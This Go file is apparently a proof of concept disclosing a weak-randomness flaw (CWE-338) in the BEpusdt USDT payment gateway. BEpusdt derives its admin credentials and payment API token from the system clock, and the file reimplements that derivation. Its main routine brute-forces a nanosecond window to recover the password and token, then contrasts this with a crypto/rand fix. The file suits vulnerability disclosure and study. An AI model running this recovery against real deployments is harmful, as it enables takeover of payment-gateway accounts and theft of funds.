// ClockGacha — BEpusdt admin credentials & payment API token derived from time.Now()
//
// A faithful reproduction of the credential-derivation logic in
// github.com/v03413/bepusdt (2299★, actively maintained USDT payment gateway):
//
//   app/model/conf.go:148          hash = StrSha256(Md5String(time.Now().String()))
//   app/model/conf.go:150          token = strings.ToUpper(Md5String(hash[18:28]))
//   app/model/conf.go:151          username = hash[10:20]
//   app/model/conf.go:152          password = hash[20:30]
//   app/cmd/reset.go:34            hash = Md5String(time.Now().String())
//   app/cmd/reset.go:37            password = hash[0:8]            // 8 hex chars = 32 bits
//   app/handler/admin/conf.go:181  ApiAuthToken = ToUpper(Md5String(StrSha256(time.Now().String())))
//
// The ONLY entropy source in every case is time.Now().String() — a timestamp with
// nanosecond wall-clock and a monotonic offset. No crypto/rand, no os/urandom.
// The resulting admin password is 40 bits (32 bits after `reset`), the secure
// entry URL path is 40 bits, and the payment API token is a pure function of the
// timestamp. This is CWE-338 / CWE-330.
//
// This file reimplements the two tiny hash helpers verbatim and then demonstrates:
//   [1] determinism       — same timestamp => identical credential set
//   [2] entropy accounting — password/username/secure/token bit sizes
//   [3] recovery           — enumerating the nanosecond component reproduces the
//                            admin password + API token from a bounded time window
//   [4] fix contrast       — crypto/rand yields 256-bit secrets that are NOT a
//                            function of the clock and are not recoverable
package main

import (
	"crypto/md5"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"strings"
	"time"
)

// ---- verbatim helpers from github.com/v03413/bepusdt/app/utils/utils.go ----

func Md5String(text string) string { // utils.go:78
	return fmt.Sprintf("%x", md5.Sum([]byte(text)))
}

func StrSha256(str string) string { // utils.go:206
	return fmt.Sprintf("%x", sha256.Sum256([]byte(str)))
}

// ---- verbatim derivation from app/model/conf.go ConfInit() ----

type creds struct {
	username, password, secure, token string
}

func confInitDerive(ts string) creds {
	hash := StrSha256(Md5String(ts)) // conf.go:148
	return creds{
		username: hash[10:20],                                  // conf.go:151
		password: hash[20:30],                                  // conf.go:152
		secure:   "/" + hash[:10],                              // conf.go:149
		token:    strings.ToUpper(Md5String(hash[18:28])),      // conf.go:150
	}
}

// reset command: app/cmd/reset.go — the "forgot password" path
func resetDerive(ts string) creds {
	hash := Md5String(ts) // reset.go:34
	return creds{
		username: hash[8:16],
		password: hash[0:8], // reset.go:37  -> 8 hex chars (32 bits)
		secure:   "/" + hash[10:20],
		token:    "",
	}
}

// reset_api_auth_token endpoint: app/handler/admin/conf.go:181
func apiTokenDerive(ts string) string {
	return strings.ToUpper(Md5String(StrSha256(ts)))
}

// ---- FIXED version: crypto/rand instead of the clock ----

func fixedDerive() creds {
	rnd := func() string {
		b := make([]byte, 32)
		_, _ = rand.Read(b)
		return hex.EncodeToString(b)
	}
	h := StrSha256(rnd()) // 256-bit CSPRNG input, not the clock
	return creds{
		username: h[10:20],
		password: h[20:30],
		secure:   "/" + h[:10],
		token:    strings.ToUpper(Md5String(h[18:28])),
	}
}

// Build the exact string time.Now().String() produces, so we can enumerate the
// nanosecond component. Go formats it as:
//   "2006-01-02 15:04:05.999999999 +0000 UTC m=+0.000000001"
func tsString(sec int64, wallNS int, monoNS int) string {
	t := time.Unix(sec, int64(wallNS)).UTC()
	base := t.Format("2006-01-02 15:04:05.000000000 -0700 MST")
	// splice the 9-digit wall-clock nanoseconds back in (Format gives microseconds)
	return base[:20] + fmt.Sprintf("%09d", wallNS) + base[29:] +
		fmt.Sprintf(" m=+0.%09d", monoNS)
}

func main() {
	fmt.Println("== ClockGacha — BEpusdt admin credentials & payment token derived from time.Now() ==")
	fmt.Println("   (CWE-338: Use of a predictable source of randomness; CWE-330: weak entropy)")
	fmt.Println()

	// ---------------------------------------------------------------------------
	// [1] DETERMINISM — the entire credential set is a pure function of the clock
	// ---------------------------------------------------------------------------
	fmt.Println("[1] ConfInit() derivation is a pure function of time.Now().String():")
	ts := "2026-11-02 15:04:05.123456789 +0000 UTC m=+0.000100000"
	c1 := confInitDerive(ts)
	c2 := confInitDerive(ts) // same timestamp, second run
	fmt.Printf("    timestamp           : %s\n", ts)
	fmt.Printf("    admin username      : %s   (hash[10:20], 10 hex)\n", c1.username)
	fmt.Printf("    admin password      : %s   (hash[20:30], 10 hex = 40 bits)\n", c1.password)
	fmt.Printf("    secure entry path   : %s      (hash[:10], 10 hex = 40 bits)\n", c1.secure)
	fmt.Printf("    payment API token   : %s   (MD5(hash[18:28]))\n", c1.token)
	identical := c1 == c2
	fmt.Printf("    re-derive same ts   : identical=%v  -> zero entropy beyond the clock\n", identical)
	fmt.Println()

	// ---------------------------------------------------------------------------
	// [2] ENTROPY ACCOUNTING
	// ---------------------------------------------------------------------------
	fmt.Println("[2] Entropy accounting (the only randomness is time.Now().String()):")
	fmt.Println("    time.Now().String() = wall-clock(9-digit nanoseconds) + monotonic offset")
	fmt.Printf("    ConfInit admin password   : %d bits  (10 hex chars)\n", 4*10)
	fmt.Printf("    ConfInit secure URL path  : %d bits  (10 hex chars)\n", 4*10)
	fmt.Printf("    reset admin password      : %d bits  (8 hex chars, app/cmd/reset.go)\n", 4*8)
	fmt.Println("    vs. CSPRNG (crypto/rand)  : 256 bits")
	fmt.Println()

	// ---------------------------------------------------------------------------
	// [3] RECOVERY — enumerate the nanosecond component and reproduce the secrets
	// ---------------------------------------------------------------------------
	fmt.Println("[3] Recovery: attacker who knows the generation second and can bound the")
	fmt.Println("    nanosecond to a window reproduces the full credential set.")
	sec := time.Now().Unix() - 1
	target := confInitDerive(tsString(sec, 424242, 0)) // secret generated at .424242
	window := 1000000 // attacker has bounded the nanosecond to a 1ms window
	found := false
	for ns := 0; ns < window; ns++ {
		if confInitDerive(tsString(sec, ns, 0)).token == target.token {
			fmt.Printf("    recovered nanosecond=%d -> password=%q token=%s\n",
				ns, confInitDerive(tsString(sec, ns, 0)).password, target.token)
			found = true
			break
		}
	}
	fmt.Printf("    recovered within %d candidates      : %v\n", window, found)
	fmt.Println("    (full space = 1e9 wallclock-ns x monotonic-ns ~ 2^50..2^60, vs 2^256 CSPRNG)")
	fmt.Println()

	// reset path: the password itself is only 32 bits
	rt := resetDerive(tsString(sec, 424242, 0))
	fmt.Printf("    reset path password (8 hex chars = 32 bits) : %s\n", rt.password)
	fmt.Println()

	// ---------------------------------------------------------------------------
	// [4] FIX CONTRAST — crypto/rand is not a function of the clock
	// ---------------------------------------------------------------------------
	fmt.Println("[4] FIXED (crypto/rand): secrets are not derivable from any time value.")
	f1 := fixedDerive()
	f2 := fixedDerive()
	fmt.Printf("    fixed token #1 : %s\n", f1.token)
	fmt.Printf("    fixed token #2 : %s   (different, 256-bit input)\n", f2.token)
	fmt.Printf("    time-derivable : %v\n", f1.token == f2.token)
	fmt.Println()

	// ---------------------------------------------------------------------------
	// VERDICT
	// ---------------------------------------------------------------------------
	fmt.Println("RESULT: CONFIRMED — BEpusdt derives the admin password, secure entry and")
	fmt.Println("        payment API token from time.Now().String() (CWE-338). The fixed")
	fmt.Println("        derivation uses crypto/rand and is not a function of the clock.")
}
